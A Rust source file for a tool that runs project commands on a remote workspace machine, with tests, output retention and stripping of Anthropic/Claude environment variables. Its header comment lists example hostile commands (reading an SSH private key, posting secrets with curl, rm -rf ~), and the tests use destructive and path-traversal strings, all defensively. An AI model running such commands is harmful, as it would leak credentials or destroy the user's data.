//! `exec_command`: run a project command where the project is.
//!
//! # This is not a sandbox, and nothing here pretends otherwise
//!
//! Design doc section 18. Path validation protects `read_file` and
//! `apply_patch`; it protects nothing here, because a command can go
//! wherever the user it runs as can go:
//!
//! ```text
//! cat ~/.ssh/id_ed25519
//! curl -d @secrets https://somewhere
//! rm -rf ~
//! ```
//!
//! There is deliberately **no deny list in this phase**. A list of
//! forbidden program names is trivially stepped around — `env claude`,
//! `/usr/bin/claude`, a wrapper script — and its real effect would be to
//! make the tool look policed when it is not. False confidence is worse
//! than none, and the design document says so in as many words: *command
//! parser 不是 sandbox*.
//!
//! What actually makes this safe is phase 5's work, not phase 2's: a
//! dedicated Unix user (`ccrun`) on the home machine with access to the
//! project and nothing else — no sudo, no ssh key, no Claude credential,
//! no browser profile — plus filesystem ACLs and the network policy of
//! section 19. Until that exists, `exec_command` is exactly as trusted as
//! the account the runtime runs as, and the design document already calls
//! a dedicated runtime identity a hard gate before real daily use.
//!
//! The one thing this phase does enforce is the core invariant: no
//! `ANTHROPIC_*` or `CLAUDE_*` variable is passed to a child. The home
//! machine holds no Claude credential and must not learn one through a
//! command ccnm ran.
//!
//! # argv, not a shell
//!
//! `cmd` is a list. There is no `sh -c`, so there is no quoting anywhere
//! in ccnm to get wrong, and the audit line is exactly what ran.
//!
//! The usual reasons to want a shell are covered without one:
//!
//! ```text
//! cargo test 2>&1 | tail -50   output is already capped and paged; just run cargo test
//! cd sub && make               the cwd parameter
//! RUST_LOG=debug cargo test    ["env", "RUST_LOG=debug", "cargo", "test"]
//! ls *.rs                      list_files
//! grep -r x .                  search_text
//! ```
//!
//! # Output
//!
//! All of it is written to the session's retention directory on the home
//! machine. What comes back is a preview — the head and the tail, because
//! the first compiler error and the final summary are both worth more than
//! the middle — plus an `output_ref` for `read_output` to page through.

use std::io::Write;
use std::path::{Path, PathBuf};
use std::time::Duration;

use rmcp::schemars;
use serde::{Deserialize, Serialize};

use crate::error::{Error, ErrorCode, Result};
use crate::mcp::path;
use crate::mcp::truncate_bytes;
use crate::process::{Cmd, run_captured};

/// Wall clock a command gets when the caller does not say.
pub const DEFAULT_TIMEOUT_MS: u64 = 120_000;
/// Ceiling on `timeout_ms`. Ten minutes is a long build; anything longer
/// wants to be a background job, which this phase does not have.
pub const MAX_TIMEOUT_MS: u64 = 600_000;
/// Bytes of output returned inline when the caller does not say.
pub const DEFAULT_PREVIEW_BYTES: usize = 4 * 1024;
/// Ceiling on `preview_bytes` (design doc section 15).
pub const MAX_PREVIEW_BYTES: usize = 16 * 1024;

/// Bytes of one stream kept on disk. Not a parameter: it bounds what ccnm
/// leaves on the user's machine, which is not the caller's decision. A
/// command that produces more still runs to completion and still reports
/// its exit code; the retained copy is cut and says so.
const MAX_RETAINED_BYTES: u64 = 64 * 1024 * 1024;

/// Runs kept per session before the oldest are removed. Without this the
/// retention directory grows for as long as the machine is up.
const MAX_RETAINED_RUNS: usize = 100;

/// Arguments of `exec_command`.
#[derive(Debug, Clone, Default, Deserialize, schemars::JsonSchema)]
pub struct ExecCommandArgs {
    /// Program and arguments, e.g. `["cargo", "test", "--lib"]`. Not a
    /// shell line: no pipes, redirection or globs.
    pub cmd: Vec<String>,
    /// Directory to run in, relative to the workspace root. Default: the root.
    #[serde(default)]
    pub cwd: Option<String>,
    /// Kill the command after this long. Default 120000, max 600000.
    #[serde(default)]
    #[schemars(range(min = 1, max = 600_000))]
    pub timeout_ms: Option<u64>,
    /// Bytes of output to return inline. Default 4096, max 16384. The rest
    /// stays on the workspace machine; use read_output to page through it.
    #[serde(default)]
    #[schemars(range(min = 0, max = 16_384))]
    pub preview_bytes: Option<u32>,
}

/// What one command did. No output beyond the preview, which is in
/// `content[0].text`.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct ExecResult {
    #[serde(skip)]
    pub text: String,
    /// What actually ran, as one line, for a human reading a log. It is
    /// not quoted, so it is not a shell command.
    pub command: String,
    /// Workspace-relative directory it ran in; `.` for the root.
    pub cwd: String,
    /// `None` when the command was killed, which for a timeout it was.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub exit_code: Option<i32>,
    pub timed_out: bool,
    pub duration_ms: u64,
    pub stdout_bytes: u64,
    pub stderr_bytes: u64,
    /// Hand this to `read_output` for the whole thing.
    pub output_ref: String,
    /// The preview left something out.
    pub truncated: bool,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub notes: Vec<String>,
}

/// Where one run's output lives.
#[derive(Debug, Clone)]
pub struct Retention {
    pub dir: PathBuf,
    pub reference: String,
}

impl Retention {
    pub fn stdout(&self) -> PathBuf {
        self.dir.join("stdout")
    }

    pub fn stderr(&self) -> PathBuf {
        self.dir.join("stderr")
    }
}

/// What to say when the directory a session works in is no longer there.
///
/// Never the absolute path: the server does not reveal where the
/// workspace lives (design doc section 17), and it is not what anyone
/// needs anyway. What they need is that this session cannot be saved by
/// retrying -- its root was resolved when it started -- and the two
/// commands that make a session with the right one.
pub(crate) fn workspace_gone(rel: &str) -> String {
    let what = if rel == "." {
        "the workspace root".to_string()
    } else {
        format!("{rel}, and the workspace root it is under,")
    };
    format!(
        "{what} is not on the runtime machine any more; it was there when this session started\nthe project was moved, renamed or deleted, or its disk is gone\na session cannot be repointed: end it and start another (ccnm stop <workspace>, then ccnm run <workspace>)"
    )
}

/// Run `args.cmd` under `root`, retaining its output under `state`.
pub fn exec_command(
    root: &Path,
    session: &str,
    state: &Path,
    args: &ExecCommandArgs,
) -> Result<ExecResult> {
    if args.cmd.is_empty() {
        return Err(Error::invalid_args(
            "cmd is empty; pass the program and its arguments, e.g. [\"cargo\", \"test\"]",
        ));
    }
    for part in &args.cmd {
        if part.contains('\0') {
            return Err(Error::invalid_args("cmd contains a NUL byte"));
        }
    }
    let timeout_ms = match args.timeout_ms {
        Some(0) => return Err(Error::invalid_args("timeout_ms must be at least 1")),
        Some(ms) => ms.min(MAX_TIMEOUT_MS),
        None => DEFAULT_TIMEOUT_MS,
    };
    let preview_bytes = args.preview_bytes.map_or(DEFAULT_PREVIEW_BYTES, |n| {
        (n as usize).min(MAX_PREVIEW_BYTES)
    });

    let (cwd_rel, cwd_abs) = match args.cwd.as_deref().map(str::trim) {
        None | Some("") | Some(".") | Some("./") => (".".to_string(), root.to_path_buf()),
        Some(raw) => {
            let resolved = path::resolve_read(root, raw)?;
            if !resolved.abs().is_dir() {
                return Err(Error::invalid_args(format!(
                    "{} is not a directory",
                    resolved.rel()
                )));
            }
            (resolved.rel().to_string(), resolved.abs().to_path_buf())
        }
    };

    let retention = make_retention(state, session)?;
    let mut cmd = Cmd::new(&args.cmd[0])
        .args(&args.cmd[1..])
        .cwd(&cwd_abs)
        .timeout(Duration::from_millis(timeout_ms));
    for key in anthropic_and_claude_vars() {
        cmd = cmd.env_remove(key);
    }

    let stdout = Sink::create(&retention.stdout())?;
    let stderr = Sink::create(&retention.stderr())?;
    let captured = run_captured(&cmd, stdout, stderr).map_err(|e| {
        if !e.message().starts_with("cannot spawn") {
            return e;
        }
        // `spawn` fails with the same ENOENT for two different reasons:
        // the program is not there, or the directory it would run in is
        // not there. Blaming the program either way produces the most
        // confidently wrong message this server has ever printed --
        // "/bin/echo is not installed on the workspace machine" -- and
        // sends whoever reads it looking for a missing echo.
        //
        // It happens: a session's root is fixed when the session starts,
        // so moving or deleting the project out from under a running
        // session leaves exactly this. Check before accusing.
        if !cwd_abs.is_dir() {
            return Error::new(ErrorCode::WrongWorkspace, workspace_gone(&cwd_rel));
        }
        Error::dependency(format!(
            "{} is not installed on the workspace machine, or is not on its PATH",
            args.cmd[0]
        ))
    })?;

    let mut notes = Vec::new();
    if captured.stdout_bytes > MAX_RETAINED_BYTES || captured.stderr_bytes > MAX_RETAINED_BYTES {
        notes.push(format!(
            "the command produced more than {} MiB on one stream; the retained copy stops there",
            MAX_RETAINED_BYTES / (1024 * 1024)
        ));
    }
    Ok(build(
        &args.cmd,
        cwd_rel,
        &retention,
        &captured,
        preview_bytes,
        notes,
    ))
}

/// A file that stops writing at [`MAX_RETAINED_BYTES`] but keeps
/// accepting, so the pipe behind it is always drained.
struct Sink {
    file: std::fs::File,
    written: u64,
}

impl Sink {
    fn create(path: &Path) -> Result<Sink> {
        let file = std::fs::File::create(path).map_err(|e| {
            Error::internal("cannot create a file for the command's output").with_source(e)
        })?;
        Ok(Sink { file, written: 0 })
    }
}

impl Write for Sink {
    fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {
        let room = MAX_RETAINED_BYTES.saturating_sub(self.written) as usize;
        if room == 0 {
            return Ok(buf.len());
        }
        let take = room.min(buf.len());
        self.file.write_all(&buf[..take])?;
        self.written += take as u64;
        Ok(buf.len())
    }

    fn flush(&mut self) -> std::io::Result<()> {
        self.file.flush()
    }
}

/// Every `ANTHROPIC_*` and `CLAUDE_*` name in this process's environment.
///
/// The core invariant is that the home machine holds no Claude credential
/// (section 6). It also must not hand one to a command it runs: the ssh
/// session that started this server could have carried one in, and a
/// child that inherited it could use it or log it.
fn anthropic_and_claude_vars() -> Vec<std::ffi::OsString> {
    strip_names(std::env::vars_os().map(|(key, _)| key))
}

/// Split out from the environment lookup so the rule can be tested. The
/// end of it — that a child really does not see them — is asserted in the
/// CLI integration test, where the server process can be given the
/// variables to begin with; this crate forbids `unsafe`, and setting an
/// environment variable is `unsafe` in this edition.
fn strip_names<I>(names: I) -> Vec<std::ffi::OsString>
where
    I: Iterator<Item = std::ffi::OsString>,
{
    names
        .filter(|key| {
            let name = key.to_string_lossy();
            name.starts_with("ANTHROPIC_") || name.starts_with("CLAUDE_")
        })
        .collect()
}

/// Where this session's runs are kept. `read_output` resolves references
/// against exactly this, so an output_ref is a reference within one
/// session and not a handle on the machine.
pub fn session_dir(state: &Path, session: &str) -> PathBuf {
    crate::paths::session_dir(state, session).join("output")
}

/// A fresh directory for this run, and a reference the caller can bring
/// back to `read_output`.
fn make_retention(state: &Path, session: &str) -> Result<Retention> {
    let session_dir = session_dir(state, session);
    std::fs::create_dir_all(&session_dir).map_err(|e| {
        Error::internal("cannot create the output retention directory").with_source(e)
    })?;
    prune(&session_dir);
    let id = format!("r-{}", &uuid::Uuid::new_v4().simple().to_string()[..16]);
    let dir = session_dir.join(&id);
    std::fs::create_dir(&dir)
        .map_err(|e| Error::internal("cannot create a directory for this run").with_source(e))?;
    Ok(Retention { dir, reference: id })
}

/// Keep the newest [`MAX_RETAINED_RUNS`] runs. Nothing else ever removes
/// these, and a long session would otherwise fill the user's disk with
/// build logs.
fn prune(session_dir: &Path) {
    let Ok(entries) = std::fs::read_dir(session_dir) else {
        return;
    };
    let mut runs: Vec<(std::time::SystemTime, PathBuf)> = entries
        .flatten()
        .filter_map(|entry| {
            let meta = entry.metadata().ok()?;
            if !meta.is_dir() {
                return None;
            }
            Some((meta.modified().ok()?, entry.path()))
        })
        .collect();
    if runs.len() < MAX_RETAINED_RUNS {
        return;
    }
    runs.sort_by_key(|(modified, _)| std::cmp::Reverse(*modified));
    for (_, path) in runs.into_iter().skip(MAX_RETAINED_RUNS - 1) {
        let _ = std::fs::remove_dir_all(path);
    }
}

fn build(
    cmd: &[String],
    cwd: String,
    retention: &Retention,
    captured: &crate::process::Captured,
    preview_bytes: usize,
    mut notes: Vec<String>,
) -> ExecResult {
    let command = cmd.join(" ");
    let duration_ms = u64::try_from(captured.duration.as_millis()).unwrap_or(u64::MAX);

    // stderr first when there is any: a failing command's reason is
    // there, and a preview that spends its budget on stdout buries it.
    let (stderr_preview, stderr_cut) = preview(&retention.stderr(), preview_bytes / 2);
    let stdout_room = preview_bytes.saturating_sub(stderr_preview.len());
    let (stdout_preview, stdout_cut) = preview(&retention.stdout(), stdout_room);

    let status = match (captured.timed_out, captured.exit_code) {
        (true, _) => format!("timed out after {duration_ms} ms"),
        (false, Some(0)) => format!("ok in {duration_ms} ms"),
        (false, Some(code)) => format!("exit {code} in {duration_ms} ms"),
        (false, None) => format!("killed after {duration_ms} ms"),
    };
    let mut text = format!(
        "$ {command}\n{status}, {} B stdout, {} B stderr\n",
        captured.stdout_bytes, captured.stderr_bytes
    );
    if !stdout_preview.is_empty() {
        text.push_str("--- stdout\n");
        text.push_str(&stdout_preview);
        if !stdout_preview.ends_with('\n') {
            text.push('\n');
        }
    }
    if !stderr_preview.is_empty() {
        text.push_str("--- stderr\n");
        text.push_str(&stderr_preview);
        if !stderr_preview.ends_with('\n') {
            text.push('\n');
        }
    }
    let truncated = stdout_cut || stderr_cut;
    text.push_str(&if truncated {
        format!(
            "[output shortened; read_output with output_ref {} for all of it]",
            retention.reference
        )
    } else {
        format!("[output_ref {}]", retention.reference)
    });
    if captured.timed_out {
        notes.push("the command was killed on timeout; what it had written is retained".into());
    }
    for note in &notes {
        text.push_str("\n[");
        text.push_str(note);
        text.push(']');
    }

    ExecResult {
        text,
        command,
        cwd,
        exit_code: captured.exit_code,
        timed_out: captured.timed_out,
        duration_ms,
        stdout_bytes: captured.stdout_bytes,
        stderr_bytes: captured.stderr_bytes,
        output_ref: retention.reference.clone(),
        truncated,
        notes,
    }
}

/// Head and tail of a file, up to `budget` bytes.
///
/// Not just the tail. A failing build puts the first error at the top and
/// the summary at the bottom, and a preview that keeps only one of them
/// sends the reader to `read_output` for something it could have said.
fn preview(path: &Path, budget: usize) -> (String, bool) {
    if budget == 0 {
        return (String::new(), path.metadata().is_ok_and(|m| m.len() > 0));
    }
    let Ok(bytes) = std::fs::read(path) else {
        return (String::new(), false);
    };
    if bytes.is_empty() {
        return (String::new(), false);
    }
    let text = String::from_utf8_lossy(&bytes);
    if text.len() <= budget {
        return (text.into_owned(), false);
    }
    let head_budget = budget / 2;
    let head = truncate_bytes(&text, head_budget);
    let tail_start = text.len() - (budget - head.len());
    let mut tail_start = tail_start.min(text.len());
    while tail_start < text.len() && !text.is_char_boundary(tail_start) {
        tail_start += 1;
    }
    let elided = tail_start.saturating_sub(head.len());
    (
        format!("{head}\n… {elided} B elided …\n{}", &text[tail_start..]),
        true,
    )
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::error::ErrorCode;
    use std::fs;

    struct Fixture {
        root: PathBuf,
        state: PathBuf,
    }

    fn fixture(name: &str) -> Fixture {
        let dir = std::env::temp_dir().join(format!("ccnm-exec-{}-{name}", std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(dir.join("root/sub")).unwrap();
        fs::create_dir_all(dir.join("state")).unwrap();
        fs::write(dir.join("root/marker.txt"), "in the root\n").unwrap();
        fs::write(dir.join("root/sub/marker.txt"), "in the subdirectory\n").unwrap();
        Fixture {
            root: fs::canonicalize(dir.join("root")).unwrap(),
            state: fs::canonicalize(dir.join("state")).unwrap(),
        }
    }

    fn run(f: &Fixture, cmd: &[&str]) -> ExecResult {
        exec_command(
            &f.root,
            "s-test",
            &f.state,
            &ExecCommandArgs {
                cmd: cmd.iter().map(|s| s.to_string()).collect(),
                ..Default::default()
            },
        )
        .unwrap()
    }

    fn fails(f: &Fixture, args: ExecCommandArgs) -> Error {
        match exec_command(&f.root, "s-test", &f.state, &args) {
            Err(e) => e,
            Ok(r) => panic!("expected a refusal, got {}", r.text),
        }
    }

    #[test]
    fn a_command_runs_in_the_workspace_and_reports_what_happened() {
        let f = fixture("basic");
        let r = run(&f, &["cat", "marker.txt"]);
        assert_eq!(r.exit_code, Some(0));
        assert!(!r.timed_out);
        assert_eq!(r.cwd, ".");
        assert_eq!(r.command, "cat marker.txt");
        assert_eq!(r.stdout_bytes, 12);
        assert_eq!(r.stderr_bytes, 0);
        assert!(!r.truncated);
        assert!(r.text.contains("--- stdout\nin the root\n"), "{}", r.text);
        assert!(r.text.contains("ok in "), "{}", r.text);
        assert!(
            r.text.contains(&format!("[output_ref {}]", r.output_ref)),
            "{}",
            r.text
        );
    }

    #[test]
    fn a_failing_command_is_a_result_not_an_error() {
        let f = fixture("failing");
        let r = run(&f, &["sh", "-c", "echo out; echo bad >&2; exit 3"]);
        assert_eq!(r.exit_code, Some(3));
        assert_eq!(r.stdout_bytes, 4);
        assert_eq!(r.stderr_bytes, 4);
        assert!(r.text.contains("exit 3 in"), "{}", r.text);
        assert!(r.text.contains("--- stderr\nbad"), "{}", r.text);
    }

    #[test]
    fn cwd_goes_through_the_same_path_policy() {
        let f = fixture("cwd");
        let r = exec_command(
            &f.root,
            "s",
            &f.state,
            &ExecCommandArgs {
                cmd: vec!["cat".into(), "marker.txt".into()],
                cwd: Some("sub".into()),
                ..Default::default()
            },
        )
        .unwrap();
        assert_eq!(r.cwd, "sub");
        assert!(r.text.contains("in the subdirectory"), "{}", r.text);

        for (cwd, code) in [
            ("../", ErrorCode::Policy),
            ("/etc", ErrorCode::Policy),
            ("~/", ErrorCode::Policy),
            ("nope", ErrorCode::InvalidArgs),
            ("marker.txt", ErrorCode::InvalidArgs),
        ] {
            let e = fails(
                &f,
                ExecCommandArgs {
                    cmd: vec!["true".into()],
                    cwd: Some(cwd.into()),
                    ..Default::default()
                },
            );
            assert_eq!(e.code(), code, "{cwd} -> {e}");
        }
    }

    #[test]
    fn there_is_no_shell_so_a_shell_line_is_one_program_name() {
        let f = fixture("noshell");
        // The whole point: this is a program called `echo hi | rm -rf /`,
        // which does not exist, rather than two commands and a pipe.
        let e = fails(
            &f,
            ExecCommandArgs {
                cmd: vec!["echo hi | rm -rf /".into()],
                ..Default::default()
            },
        );
        assert_eq!(e.code(), ErrorCode::Dependency);
        assert!(e.message().contains("not installed"), "{e}");
        // And an argument that looks like a redirect is just an argument.
        let r = run(&f, &["echo", "a", ">", "b"]);
        assert!(r.text.contains("a > b"), "{}", r.text);
        assert!(
            !f.root.join("b").exists(),
            "a file was redirected into being"
        );
    }

    /// `spawn` fails with the same ENOENT whether the program is missing
    /// or the directory it would run in is. Blaming the program produced
    /// the most confidently wrong message this server has printed --
    /// "/bin/echo is not installed on the workspace machine" -- on a
    /// session whose project had been moved out from under it.
    #[test]
    fn a_vanished_workspace_is_not_reported_as_a_missing_program() {
        let f = fixture("vanished");
        assert_eq!(run(&f, &["/bin/echo", "hi"]).exit_code, Some(0));

        // The way it happens for real: someone moves the project.
        let moved = f.root.with_extension("moved");
        let _ = fs::remove_dir_all(&moved);
        fs::rename(&f.root, &moved).unwrap();

        let e = exec_command(
            &f.root,
            "s-test",
            &f.state,
            &ExecCommandArgs {
                cmd: vec!["/bin/echo".into(), "hi".into()],
                ..Default::default()
            },
        )
        .unwrap_err();
        assert_eq!(e.code(), ErrorCode::WrongWorkspace);
        assert!(
            !e.message().contains("not installed"),
            "/bin/echo is installed; the workspace is what is missing: {e}"
        );
        assert!(e.message().contains("not on the runtime machine"), "{e}");
        assert!(e.message().contains("ccnm stop"), "{e}");
        // The absolute path is never revealed, gone or not.
        assert!(!e.message().contains(&moved.display().to_string()), "{e}");
    }

    #[test]
    fn every_anthropic_and_claude_name_is_stripped_and_nothing_else_is() {
        let names: Vec<std::ffi::OsString> = [
            "ANTHROPIC_API_KEY",
            "ANTHROPIC_BASE_URL",
            "CLAUDE_CODE_OAUTH_TOKEN",
            "CLAUDE_CODE_PROVIDER_MANAGED_BY_HOST",
            "PATH",
            "HOME",
            "MY_ANTHROPIC_KEY",
            "CLAUDECODE",
        ]
        .into_iter()
        .map(std::ffi::OsString::from)
        .collect();
        let stripped: Vec<String> = strip_names(names.into_iter())
            .into_iter()
            .map(|s| s.to_string_lossy().into_owned())
            .collect();
        assert_eq!(
            stripped,
            [
                "ANTHROPIC_API_KEY",
                "ANTHROPIC_BASE_URL",
                "CLAUDE_CODE_OAUTH_TOKEN",
                "CLAUDE_CODE_PROVIDER_MANAGED_BY_HOST",
            ]
        );
        // The prefix is a prefix, not a substring: a variable of the
        // user's own that merely mentions Anthropic keeps working, and
        // CLAUDECODE has no underscore so it is not one of ours.
    }

    #[test]
    fn a_child_inherits_the_rest_of_the_environment() {
        // The counterpart of the stripping: this is not a clean room, and
        // a command that needs PATH to find cargo has to get it.
        let f = fixture("env");
        let r = run(&f, &["sh", "-c", "test -n \"$PATH\" && echo has-path"]);
        assert_eq!(r.exit_code, Some(0));
        assert!(r.text.contains("has-path"), "{}", r.text);
    }

    #[test]
    fn a_slow_command_is_killed_and_what_it_wrote_is_kept() {
        let f = fixture("timeout");
        let started = std::time::Instant::now();
        let r = exec_command(
            &f.root,
            "s",
            &f.state,
            &ExecCommandArgs {
                cmd: vec!["sh".into(), "-c".into(), "echo early; sleep 30".into()],
                timeout_ms: Some(400),
                ..Default::default()
            },
        )
        .unwrap();
        assert!(r.timed_out);
        assert_eq!(r.exit_code, None);
        assert!(
            started.elapsed() < Duration::from_secs(10),
            "{:?}",
            started.elapsed()
        );
        assert!(r.text.contains("timed out after"), "{}", r.text);
        assert!(
            r.text.contains("early"),
            "what it wrote before the kill: {}",
            r.text
        );
        assert!(
            r.notes.iter().any(|n| n.contains("killed on timeout")),
            "{:?}",
            r.notes
        );
    }

    #[test]
    fn long_output_is_retained_whole_and_previewed_at_both_ends() {
        let f = fixture("long");
        let r = exec_command(
            &f.root,
            "s",
            &f.state,
            &ExecCommandArgs {
                cmd: vec![
                    "sh".into(),
                    "-c".into(),
                    "i=0; while [ $i -lt 4000 ]; do echo line $i; i=$((i+1)); done".into(),
                ],
                preview_bytes: Some(2048),
                ..Default::default()
            },
        )
        .unwrap();
        assert!(r.stdout_bytes > 30_000, "{}", r.stdout_bytes);
        assert!(r.truncated);
        assert!(
            r.text.len() < 4096,
            "the preview blew its budget: {}",
            r.text.len()
        );
        // Both ends, so neither the first error nor the summary is lost.
        assert!(r.text.contains("line 0\n"), "{}", r.text);
        assert!(r.text.contains("line 3999"), "{}", r.text);
        assert!(r.text.contains("B elided"), "{}", r.text);
        assert!(r.text.contains("read_output with output_ref"), "{}", r.text);

        // All of it is on disk, exactly as produced.
        let path = f
            .state
            .join("sessions/s/output")
            .join(&r.output_ref)
            .join("stdout");
        let retained = fs::read_to_string(&path).unwrap();
        assert_eq!(retained.len() as u64, r.stdout_bytes);
        assert!(retained.starts_with("line 0\n"));
        assert!(retained.ends_with("line 3999\n"));
    }

    #[test]
    fn the_preview_never_splits_a_character() {
        let f = fixture("utf8");
        let r = exec_command(
            &f.root,
            "s",
            &f.state,
            &ExecCommandArgs {
                cmd: vec![
                    "sh".into(),
                    "-c".into(),
                    "printf '中%.0s' $(seq 1 4000)".into(),
                ],
                preview_bytes: Some(101),
                ..Default::default()
            },
        )
        .unwrap();
        // A String would have panicked on a bad boundary before this line.
        assert!(r.truncated);
        assert!(r.text.contains('中'));
    }

    #[test]
    fn bad_arguments_are_refused_before_anything_runs() {
        let f = fixture("badargs");
        let e = fails(&f, ExecCommandArgs::default());
        assert_eq!(e.code(), ErrorCode::InvalidArgs);
        assert!(e.message().contains("cmd is empty"), "{e}");

        let e = fails(
            &f,
            ExecCommandArgs {
                cmd: vec!["echo".into(), "a\0b".into()],
                ..Default::default()
            },
        );
        assert_eq!(e.code(), ErrorCode::InvalidArgs);

        let e = fails(
            &f,
            ExecCommandArgs {
                cmd: vec!["true".into()],
                timeout_ms: Some(0),
                ..Default::default()
            },
        );
        assert_eq!(e.code(), ErrorCode::InvalidArgs);
    }

    #[test]
    fn a_missing_program_names_itself_and_is_a_dependency_problem() {
        let f = fixture("missing");
        let e = fails(
            &f,
            ExecCommandArgs {
                cmd: vec!["ccnm-definitely-not-a-program".into()],
                ..Default::default()
            },
        );
        assert_eq!(e.code(), ErrorCode::Dependency);
        assert!(e.message().contains("ccnm-definitely-not-a-program"), "{e}");
    }

    #[test]
    fn structured_content_carries_no_output_and_no_local_paths() {
        let f = fixture("bounded");
        let r = run(&f, &["cat", "marker.txt"]);
        let json = serde_json::to_string(&r).unwrap();
        assert!(!json.contains("in the root"), "{json}");
        assert!(!json.contains(&f.root.display().to_string()), "{json}");
        assert!(!json.contains(&f.state.display().to_string()), "{json}");
        assert!(json.contains("\"output_ref\""), "{json}");
    }

    #[test]
    fn old_runs_are_pruned_so_the_directory_does_not_grow_forever() {
        let f = fixture("prune");
        let session_dir = f.state.join("sessions/s-test/output");
        fs::create_dir_all(&session_dir).unwrap();
        for n in 0..MAX_RETAINED_RUNS + 20 {
            fs::create_dir_all(session_dir.join(format!("r-old{n:04}"))).unwrap();
        }
        run(&f, &["true"]);
        let count = fs::read_dir(&session_dir).unwrap().count();
        assert!(count <= MAX_RETAINED_RUNS, "{count} runs kept");
    }

    #[test]
    fn a_session_id_cannot_escape_the_retention_directory() {
        // The id names a directory and arrives from the other machine, so
        // it goes through the same filter every state path uses.
        let state = Path::new("/state");
        assert_eq!(
            session_dir(state, "s-1_ok"),
            Path::new("/state/sessions/s-1_ok/output")
        );
        // The property that matters is not "the name looks tidy" but
        // "the name is one segment". `../../etc` filters down to
        // `....etc`, which is an odd directory name and cannot traverse
        // anywhere; `..` and `../..` are all dots and fall back.
        for hostile in ["../../etc", "a/b", "", "/", "..", "../..", "x/../../y"] {
            let dir = session_dir(state, hostile);
            let inside = dir
                .strip_prefix("/state/sessions")
                .unwrap_or_else(|_| panic!("{hostile} escaped to {}", dir.display()));
            let parts: Vec<_> = inside.components().collect();
            assert_eq!(parts.len(), 2, "{hostile} -> {}", dir.display());
            assert!(
                !parts
                    .iter()
                    .any(|c| matches!(c, std::path::Component::ParentDir)),
                "{hostile} -> {}",
                dir.display()
            );
        }
        assert!(session_dir(state, &"x".repeat(200)).to_string_lossy().len() < 100);
    }
}
